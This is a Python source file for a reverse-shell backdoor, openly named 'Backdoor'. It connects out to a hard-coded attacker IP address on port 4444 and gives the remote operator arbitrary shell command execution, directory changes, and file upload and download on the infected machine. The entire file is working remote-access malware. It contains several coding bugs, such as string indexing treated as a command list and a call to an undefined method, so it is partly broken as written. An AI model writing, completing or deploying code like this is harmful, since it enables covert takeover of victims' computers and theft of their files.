import os
import json
import socket
import subprocess
from base64 import b64encode, b64decode

class Backdoor:
    
    def __init__(self, attacker_ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((attacker_ip, port))

    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json_data
            except ValueError:
                continue 

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except:
            return '[x] Error during command execution'
    
    def change_working_dir(self, path):
        os.chdir(path)
        return f'[+] Changing working directory to {path}'
    
    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(b64decode(content))
            return '[+] Upload successful.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return  b64encode(file.read())

    def run(self):
        while True:
            command = self.connection.recv(1024).decode('utf-8')
            
            try :

                if command[0].lower() == 'exit':
                    self.connection.close()
                    exit()

                elif command[0].lower() == 'cd' and len(command)>1:
                    command_result = self.change_working_dir(command[1])

                elif command[0].lower() == 'download':
                    command_result = self.read_file(command[1])
                
                elif command[0].lower() == 'upload': # ['upload', 'file name', 'file content as binary']
                    command_result = self.write(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

            except Exception:
      
                command_result('[x] Error during command execution')

            self.send(command_result)

        self.connection.close()

attacker_ip = "192.168.106.129"
bd = Backdoor(attacker_ip, 4444)
bd.run()
